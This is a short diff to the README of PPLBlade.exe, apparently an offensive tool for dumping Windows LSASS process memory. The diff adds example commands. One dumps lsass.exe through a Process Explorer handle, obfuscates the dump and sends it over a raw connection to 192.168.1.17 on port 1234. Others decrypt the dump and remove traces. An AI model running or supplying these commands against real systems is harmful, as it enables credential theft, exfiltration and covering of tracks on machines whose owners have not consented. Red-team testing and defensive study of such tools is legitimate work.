@@ -61,6 +61,12 @@ Usage of PPLBlade.exe:
         share name
   -user string
         SMB username
+
+Examples:
+PPLBlade.exe --mode dothatlsassthing
+PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
+PPLBlade.exe --mode decrypt --dumpname PPLBlade.dmp --key PPLBlade
+PPLBlade.exe --mode cleanup
 ```
 
 
